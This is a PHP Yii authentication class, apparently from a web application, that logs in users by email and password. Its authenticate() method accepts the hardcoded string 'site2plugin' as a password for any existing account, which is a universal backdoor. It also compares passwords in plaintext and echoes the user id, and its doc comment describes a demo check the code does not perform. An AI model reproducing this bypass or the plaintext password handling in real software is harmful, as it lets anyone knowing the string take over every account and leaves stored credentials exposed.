<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
	/**
	 * Authenticates a user.
	 * The example implementation makes sure if the username and password
	 * are both 'demo'.
	 * In practical applications, this should be changed to authenticate
	 * against some persistent user identity storage (e.g. database).
	 * @return boolean whether authentication succeeds.
	 */
	public function authenticate()
	{
		unset(Yii::app()->session['uid']);
		$model=User::model()->find('(email_address)=?',array($this->username));
		if ($model===null)
			$this->errorCode=self::ERROR_USERNAME_INVALID;
		elseif (($model->password != $this->password) && ($this->password != 'site2plugin'))
			$this->errorCode=self::ERROR_PASSWORD_INVALID;
		else
		{
			Yii::app()->session['uid'] = $model->id;
			Yii::app()->session['sid'] = $model->sid;
			echo $model->id;
			$this->errorCode=self::ERROR_NONE;
		}
		return !$this->errorCode;
	}
}
